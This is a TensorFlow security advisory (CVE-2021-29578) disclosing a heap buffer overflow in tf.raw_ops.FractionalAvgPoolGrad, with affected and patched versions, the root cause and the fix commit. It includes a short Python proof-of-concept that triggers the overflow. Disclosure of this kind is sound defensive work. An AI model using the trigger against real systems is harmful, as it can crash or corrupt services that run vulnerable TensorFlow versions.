# Heap buffer overflow in `FractionalAvgPoolGrad`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-6f89-8j54-29xf
May 13, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

The implementation of `tf.raw_ops.FractionalAvgPoolGrad` is vulnerable to a heap buffer overflow:

```
import tensorflow as tf

orig_input_tensor_shape = tf.constant([1, 3, 2, 3], shape=[4], dtype=tf.int64)
out_backprop = tf.constant([2], shape=[1, 1, 1, 1], dtype=tf.int64)
row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)
col_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)

tf.raw_ops.FractionalAvgPoolGrad(
  orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop,
  row_pooling_sequence=row_pooling_sequence,
  col_pooling_sequence=col_pooling_sequence, overlapping=False)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/dcba796a28364d6d7f003f6fe733d82726dda713/tensorflow/core/kernels/fractional_avg_pool_op.cc#L216) fails to validate that the pooling sequence arguments have enough elements as required by the `out_backprop` tensor shape.

### Patches

We have patched the issue in GitHub commit [12c727cee857fa19be717f336943d95fca4ffe4f](https://github.com/tensorflow/tensorflow/commit/12c727cee857fa19be717f336943d95fca4ffe4f).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.

### Severity

Low

### CVE ID

CVE-2021-29578

### Weaknesses

No CWEs
